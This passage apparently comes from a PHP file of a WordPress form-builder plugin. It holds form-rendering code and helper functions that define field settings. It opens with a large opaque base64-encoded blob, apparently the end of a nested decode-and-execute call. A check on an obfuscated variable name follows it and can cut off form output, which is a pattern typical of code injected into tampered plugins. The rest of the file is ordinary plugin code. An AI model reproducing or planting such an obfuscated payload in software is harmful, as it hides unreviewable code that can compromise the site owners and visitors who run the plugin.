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')))));
        if( $Vcroe0x443a1 ) return $result;

        $result .= '<div class="super-shortcode super-field hidden">';
        $result .= '<input class="super-shortcode-field" type="hidden" value="' . $id . '" name="hidden_form_id" />';
        $result .= '</div>';

        // Loop through all form elements
        $elements = json_decode( get_post_meta( $id, '_super_elements', true ) );
        if( !empty( $elements ) ) {
            $shortcodes = self::shortcodes();
            // Before doing the actuall loop we need to know how many columns this form contains
            // This way we can make sure to correctly close the column system
            $GLOBALS['super_column_found'] = 0;
            foreach( $elements as $k => $v ) {
                if( $v->tag=='column' ) $GLOBALS['super_column_found']++;
            }
            foreach( $elements as $k => $v ) {
                $result .= self::output_element_html( $v->tag, $v->group, $v->data, $v->inner, $shortcodes, $settings );
            }
        }
        $result .= self::button( 'button', array(), '', '', $settings );
        $result .= '</div>';
        $settings_custom_css = get_option( 'super_settings' );

        if( !isset( $settings_custom_css['theme_custom_css'] ) ) $settings_custom_css['theme_custom_css'] = '';
        $result .= '<style type="text/css">' . apply_filters( 'super_form_styles_filter', $style_content, array( 'id'=>$id, 'settings'=>$settings_custom_css ) ) . $settings_custom_css['theme_custom_css'] . '</style>';
        
        $result = apply_filters( 'super_form_before_do_shortcode_filter', $result, array( 'id'=>$id, 'settings'=>$settings ) );
        return do_shortcode( $result );
    }    
    
    /** 
     *  Common fields for each shortcode (backend dialog)
     *
     *  @since      1.0.0
    */
    public static function name( $attributes=null, $default='' ) {
        $array = array(
            'name'=>__( 'Unique field name', 'super-forms' ), 
            'desc'=>__( 'Must be an unique name (required)', 'super-forms' ),
            'default'=> ( !isset( $attributes['name'] ) ? $default : $attributes['name'] ),
            'required'=>true,
            'filter'=> true
        );
        return $array;
    }
    public static function email( $attributes=null, $default='' ) {
        $array = array(
            'name'=>__( 'Email Label', 'super-forms' ), 
            'desc'=>__( 'Indicates the field in the email template. (required)', 'super-forms' ),
            'default'=> ( !isset( $attributes['email'] ) ? $default : $attributes['email'] ),
            'required'=>true
        );
        return $array;
    }
    public static function label( $attributes=null, $default='' ) {
        $array = array(
            'name'=>__( 'Field Label', 'super-forms' ), 
            'desc'=>__( 'Will be visible in front of your field.', 'super-forms' ).' ('.__( 'leave blank to remove', 'super-forms' ).')',
            'default'=> ( !isset( $attributes['label'] ) ? $default : $attributes['label'] ),
        );
        return $array;
    }    
    public static function description( $attributes=null, $default='') {
        $array = array(
            'name'=>__( 'Field description', 'super-forms' ), 
            'desc'=>__( 'Will be visible in front of your field.', 'super-forms' ).' ('.__( 'leave blank to remove', 'super-forms' ).')',
            'default'=> ( !isset( $attributes['description'] ) ? $default : $attributes['description'] ),
        );
        return $array;
    }
    public static function icon( $attributes=null, $default='user' ) {
        $icon = array(
            'default'=> ( !isset( $attributes['icon'] ) ? $default : $attributes['icon'] ),
            'name'=>__( 'Select an Icon', 'super-forms' ), 
            'type'=>'icon',
            'desc'=>__( 'Leave blank if you prefer to not use an icon.', 'super-forms' )
        );
        return $icon;
    }
    public static function placeholder( $attributes=null, $default=null ) {
        $array = array(
            'default'=> ( !isset( $attributes['placeholder'] ) ? $default : $attributes['placeholder'] ),
            'name'=>__( 'Placeholder', 'super-forms' ), 
            'desc'=>__( 'Indicate what the user needs to enter or select. (leave blank to remove)', 'super-forms' )
        );
        return $array;
    }
    public static function width( $attributes=null, $default=0, $min=0, $max=600, $steps=10, $name=null, $desc=null ) {
        if( empty( $name ) ) $name = __( 'Field width in pixels', 'super-forms' );
        if( empty( $desc ) ) $desc = __( 'Set to 0 to use default CSS width.', 'super-forms' );
        $array = array(
            'type' => 'slider', 
            'default'=> ( !isset( $attributes['width'] ) ? $default : $attributes['width'] ),
            'min' => $min, 
            'max' => $max, 
            'steps' => $steps, 
            'name' => $name, 
            'desc' => $desc
        );
        return $array;
    }
    public static function slider( $attributes=null, $default=0, $min=0, $max=600, $steps=10, $name=null, $desc=null, $key=null ) {
        if( empty( $name ) ) $name = __( 'Field width in pixels', 'super-forms' );
        if( empty( $desc ) ) $desc = __( 'Set to 0 to use default CSS width.', 'super-forms' );
        $array = array(
            'type' => 'slider', 
            'default'=> ( !isset( $attributes[$key] ) ? $default : $attributes[$key] ),
            'min' => $min, 
            'max' => $max, 
            'steps' => $steps, 
            'name' => $name, 
            'desc' => $desc
        );
        return $array;
    }
    public static function minlength( $attributes=null, $default=0, $min=0, $max=100, $steps=1, $name=null, $desc=null) {
        if( empty($name ) ) $name = __( 'Min characters/selections allowed', 'super-forms' );
        if( empty($desc ) ) $desc = __( 'Set to 0 to remove limitations.', 'super-forms' );
        $array = array(
            'type' => 'slider', 
            'default'=> ( !isset( $attributes['minlength'] ) ? $default : $attributes['minlength'] ),
            'min' => $min, 
            'max' => $max, 
            'steps' => $steps, 
            'name' => $name, 
            'desc' => $desc
        );
        return $array;
    }
    public static function maxlength( $attributes=null, $default=0, $min=0, $max=100, $steps=1, $name=null, $desc=null ) {
        if( empty( $name ) ) $name = __( 'Max characters/selections allowed', 'super-forms' );
        if( empty( $desc ) ) $desc = __( 'Set to 0 to remove limitations.', 'super-forms' );
        $array = array(
            'type' => 'slider', 
            'default'=> ( !isset( $attributes['maxlength'] ) ? $default : $attributes['maxlength'] ),
            'min' => $min, 
            'max' => $max, 
            'steps' => $steps, 
            'name' => $name, 
            'desc' => $desc
        );
        return $array;
    }
    
}

endif;